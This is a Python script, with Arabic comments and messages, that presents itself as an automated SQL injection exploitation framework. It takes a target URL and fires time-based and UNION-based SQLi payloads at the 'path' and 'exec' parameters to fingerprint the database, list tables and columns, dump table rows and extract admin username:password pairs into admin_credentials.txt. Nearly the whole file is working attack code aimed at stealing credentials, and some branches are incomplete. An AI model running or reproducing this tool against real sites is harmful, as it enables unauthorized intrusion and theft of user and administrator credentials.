#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ADVANCED SQL INJECTION EXPLOITATION FRAMEWORK
Target: Vulnerable Website with SQLi in 'path' and 'exec' parameters
Author: Security Researcher
"""

import requests
import time
import re
from urllib.parse import quote
from colorama import Fore, Style, init

init(autoreset=True)

class SQLiExploiter:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
    def print_banner(self):
        """Display exploitation banner"""
        print(Fore.RED + r"""
    ╔═══════════════════════════════════════════════════════════════════════════════╗
    ║                                                                               ║
    ║    ███████╗ ██████╗ ██╗         ██╗███╗   ██╗██████╗ ███████╗ ██████╗████████╗║
    ║    ██╔════╝██╔═══██╗██║         ██║████╗  ██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝║
    ║    ███████╗██║   ██║██║         ██║██╔██╗ ██║██████╔╝█████╗  ██║        ██║   ║
    ║    ╚════██║██║   ██║██║         ██║██║╚██╗██║██╔═══╝ ██╔══╝  ██║        ██║   ║
    ║    ███████║╚██████╔╝███████╗    ██║██║ ╚████║██║     ███████╗╚██████╗   ██║   ║
    ║    ╚══════╝ ╚═════╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ║
    ║                                                                               ║
    ║                  ADVANCED SQL INJECTION EXPLOITATION                          ║
    ║                       Time-Based & Boolean-Based SQLi                         ║
    ╚═══════════════════════════════════════════════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def test_time_based_sqli(self, param, payload, delay=5):
        """Test time-based SQL injection"""
        test_url = f"{self.base_url}?{param}={quote(payload)}"
        
        start_time = time.time()
        response = self.session.get(test_url, timeout=delay+5, verify=False)
        response_time = time.time() - start_time
        
        return response_time > delay, response_time, response
    
    def extract_database_info(self, param):
        """Extract database information"""
        print(f"\n{Fore.CYAN}[*] استخراج معلومات قاعدة البيانات من {param}{Style.RESET_ALL}")
        
        # 1. معرفة إصدار الداتابيس
        print(f"{Fore.YELLOW}[*] معرفة إصدار الداتابيس...{Style.RESET_ALL}")
        
        version_payloads = {
            'MySQL': f"' AND SLEEP(5) AND @@version LIKE '%'--",
            'PostgreSQL': f"' AND (SELECT pg_sleep(5) FROM version())--",
            'MSSQL': f"' WAITFOR DELAY '00:00:05'--",
            'Oracle': f"' AND (SELECT COUNT(*) FROM all_users WHERE username LIKE '%')>0 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0--"
        }
        
        detected_db = None
        for db_type, payload in version_payloads.items():
            print(f"{Fore.WHITE}[*] اختبار {db_type}...{Style.RESET_ALL}")
            is_vuln, delay, response = self.test_time_based_sqli(param, payload)
            if is_vuln:
                detected_db = db_type
                print(f"{Fore.GREEN}[+] الداتابيس: {db_type} (تأخير: {delay:.2f}ثانية){Style.RESET_ALL}")
                break
        
        if not detected_db:
            print(f"{Fore.RED}[-] لم يتم اكتشاف نوع الداتابيس{Style.RESET_ALL}")
            return None
        
        # 2. استخراج اسم الداتابيس الحالي
        print(f"\n{Fore.YELLOW}[*] استخراج اسم الداتابيس...{Style.RESET_ALL}")
        
        if detected_db == 'MySQL':
            # استخدام UNION-based لاستخراج البيانات
            union_payloads = [
                f"' UNION SELECT 1,database(),3,4,5--",
                f"' UNION SELECT null,database(),null--",
                f"') UNION SELECT 1,database(),3--"
            ]
        elif detected_db == 'PostgreSQL':
            union_payloads = [
                f"' UNION SELECT 1,current_database(),3--",
                f"') UNION SELECT current_database(),2--"
            ]
        
        database_name = None
        for payload in union_payloads:
            test_url = f"{self.base_url}?{param}={quote(payload)}"
            response = self.session.get(test_url, verify=False)
            
            # البحث عن اسم الداتابيس في الرد
            if response.status_code == 200:
                # تحليل الرد للعثور على اسم الداتابيس
                db_patterns = [
                    r'(\w+_db|\w+_database|\w+db)',
                    r'Database:\s*(\w+)',
                    r'dbname:\s*(\w+)'
                ]
                
                for pattern in db_patterns:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        database_name = match.group(1)
                        print(f"{Fore.GREEN}[+] اسم الداتابيس: {database_name}{Style.RESET_ALL}")
                        break
            
            if database_name:
                break
        
        return detected_db, database_name
    
    def extract_tables(self, param, db_type, db_name=None):
        """استخراج أسماء الجداول"""
        print(f"\n{Fore.CYAN}[*] استخراج أسماء الجداول{Style.RESET_ALL}")
        
        tables = []
        
        if db_type == 'MySQL':
            # استخراج الجداول من information_schema
            payloads = [
                f"' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()--",
                f"' UNION SELECT null,table_name,null FROM information_schema.tables WHERE table_schema=database() LIMIT 0,10--"
            ]
        elif db_type == 'PostgreSQL':
            payloads = [
                f"' UNION SELECT 1,tablename,3 FROM pg_tables WHERE schemaname='public'--",
                f"' UNION SELECT tablename,2 FROM pg_tables WHERE schemaname='public' LIMIT 10--"
            ]
        
        for payload in payloads:
            test_url = f"{self.base_url}?{param}={quote(payload)}"
            response = self.session.get(test_url, verify=False)
            
            if response.status_code == 200:
                # البحث عن أسماء الجداول في الرد
                table_patterns = [
                    r'<td[^>]*>(\w+)</td>',
                    r'>(\w+_table|\w+_tbl|\w+_users|\w+_admin)<',
                    r'Table:\s*(\w+)',
                    r'(\busers\b|\badmins?\b|\bcustomers?\b|\borders?\b|\bproducts?\b)'
                ]
                
                for pattern in table_patterns:
                    found_tables = re.findall(pattern, response.text, re.IGNORECASE)
                    for table in found_tables:
                        if table not in tables and len(table) > 3:
                            tables.append(table)
            
            if tables:
                break
        
        print(f"{Fore.GREEN}[+] الجداول المكتشفة ({len(tables)}):{Style.RESET_ALL}")
        for i, table in enumerate(tables[:20], 1):  # عرض أول 20 جدول فقط
            print(f"   {i}. {table}")
        
        return tables
    
    def extract_table_data(self, param, db_type, table_name):
        """استخراج بيانات من جدول معين"""
        print(f"\n{Fore.CYAN}[*] استخراج بيانات من جدول: {table_name}{Style.RESET_ALL}")
        
        # محاولة استخراج أسماء الأعمدة أولاً
        if db_type == 'MySQL':
            column_payload = f"' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='{table_name}' AND table_schema=database() LIMIT 0,5--"
        elif db_type == 'PostgreSQL':
            column_payload = f"' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 5--"
        
        test_url = f"{self.base_url}?{param}={quote(column_payload)}"
        response = self.session.get(test_url, verify=False)
        
        columns = []
        if response.status_code == 200:
            # البحث عن أسماء الأعمدة
            col_patterns = [
                r'>(\w+_id|\w+_name|\w+_email|\w+_password|\w+_username)<',
                r'Column:\s*(\w+)',
                r'(\busername\b|\bpassword\b|\bemail\b|\bname\b|\bid\b)'
            ]
            
            for pattern in col_patterns:
                found_cols = re.findall(pattern, response.text, re.IGNORECASE)
                columns.extend(found_cols)
        
        columns = list(set(columns))[:5]  # أخذ أول 5 أعمدة
        
        print(f"{Fore.GREEN}[+] الأعمدة المكتشفة: {', '.join(columns)}{Style.RESET_ALL}")
        
        # استخراج البيانات من الجدول
        if columns:
            if db_type == 'MySQL':
                data_payload = f"' UNION SELECT 1,CONCAT_WS('|',{','.join(columns)}),3,4 FROM {table_name} LIMIT 0,10--"
            elif db_type == 'PostgreSQL':
                data_payload = f"' UNION SELECT 1,CONCAT({','.join(columns)},'|'),3 FROM {table_name} LIMIT 10--"
            
            test_url = f"{self.base_url}?{param}={quote(data_payload)}"
            response = self.session.get(test_url, verify=False)
            
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] بيانات من {table_name}:{Style.RESET_ALL}")
                # تحليل البيانات
                lines = response.text.split('\n')
                for line in lines[:20]:  # عرض أول 20 سطر
                    if '|' in line:
                        data = line.split('|')
                        print(f"   • {' | '.join(data[:5])}")
        
        return columns
    
    def dump_admin_credentials(self, param, db_type):
        """محاولة استخراج بيانات المسؤولين"""
        print(f"\n{Fore.RED}[*] البحث عن بيانات المسؤولين...{Style.RESET_ALL}")
        
        admin_tables = ['users', 'admin', 'administrators', 'admins', 'user']
        
        for table in admin_tables:
            print(f"{Fore.YELLOW}[*] فحص جدول: {table}{Style.RESET_ALL}")
            
            # محاولة استخراج بيانات المسؤولين
            if db_type == 'MySQL':
                payload = f"' UNION SELECT 1,CONCAT(username,':',password),3,4 FROM {table} WHERE username LIKE '%admin%' OR is_admin=1 LIMIT 5--"
            elif db_type == 'PostgreSQL':
                payload = f"' UNION SELECT 1,CONCAT(username,':',password),3 FROM {table} WHERE username LIKE '%admin%' OR is_admin=true LIMIT 5--"
            
            test_url = f"{self.base_url}?{param}={quote(payload)}"
            response = self.session.get(test_url, verify=False)
            
            if response.status_code == 200:
                # البحث عن بيانات الاعتماد
                cred_patterns = [
                    r'>([^<]+?:[^<]+?)<',
                    r'([a-zA-Z0-9_]+:[a-zA-Z0-9_$!@#]+)',
                    r'(admin[^<]*?:[^<]+)'
                ]
                
                for pattern in cred_patterns:
                    credentials = re.findall(pattern, response.text)
                    for cred in credentials:
                        if ':' in cred and len(cred) > 5:
                            print(f"{Fore.GREEN}[+] بيانات الاعتماد: {cred}{Style.RESET_ALL}")
                            # حفظ في ملف
                            with open('admin_credentials.txt', 'a') as f:
                                f.write(f"{cred}\n")
    
    def automated_exploitation(self):
        """استغلال تلقائي للثغرات"""
        self.print_banner()
        
        print(f"\n{Fore.CYAN}[*] بدء الاستغلال التلقائي لـ: {self.base_url}{Style.RESET_ALL}")
        
        # المعلمات المعرضة للثغرات
        vulnerable_params = ['path', 'exec']
        
        for param in vulnerable_params:
            print(f"\n{Fore.YELLOW}─" * 70 + Style.RESET_ALL)
            print(f"{Fore.YELLOW}[*] اختبار المعلمة: {param}{Style.RESET_ALL}")
            
            # 1. تأكيد الثغرة
            print(f"{Fore.WHITE}[*] تأكيد SQL Injection...{Style.RESET_ALL}")
            
            test_payload = f"' AND SLEEP(5)--"
            is_vuln, delay, response = self.test_time_based_sqli(param, test_payload)
            
            if is_vuln:
                print(f"{Fore.GREEN}[✅] SQL Injection مؤكد! (تأخير: {delay:.2f}ثانية){Style.RESET_ALL}")
                
                # 2. استخراج معلومات الداتابيس
                db_info = self.extract_database_info(param)
                if db_info:
                    db_type, db_name = db_info
                    
                    # 3. استخراج الجداول
                    tables = self.extract_tables(param, db_type, db_name)
                    
                    # 4. البحث عن جداول المستخدمين
                    user_tables = [t for t in tables if 'user' in t.lower() or 'admin' in t.lower()]
                    
                    for user_table in user_tables[:3]:  # فحص أول 3 جداول مستخدمين
                        self.extract_table_data(param, db_type, user_table)
                    
                    # 5. محاولة استخراج بيانات المسؤولين
                    self.dump_admin_credentials(param, db_type)
                    
                else:
                    print(f"{Fore.RED}[-] فشل في استخراج معلومات الداتابيس{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] المعلمة {param} غير معرضة للثغرات{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"║{'تم الانتهاء من الاستغلال':^78}║")
        print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}[+] النتائج المحفوظة:{Style.RESET_ALL}")
        print(f"   • admin_credentials.txt - بيانات اعتماد المسؤولين")
        print(f"\n{Fore.YELLOW}[!] ملاحظة:{Style.RESET_ALL}")
        print(f"   قد تحتاج لضبط الـ payloads حسب نوع الداتابيس وبنية التطبيق")

# الاستخدام
if __name__ == "__main__":
    # الحصول على URL من المستخدم
    print(f"{Fore.CYAN}[*] أدخل عنوان URL الذي يحتوي على ثغرات SQL Injection{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] مثال: http://example.com/vulnerable.php{Style.RESET_ALL}")
    
    target_url = input(f"{Fore.YELLOW}[?] URL: {Style.RESET_ALL}")
    
    if not target_url.startswith('http'):
        target_url = 'http://' + target_url
    
    exploiter = SQLiExploiter(target_url)
    exploiter.automated_exploitation()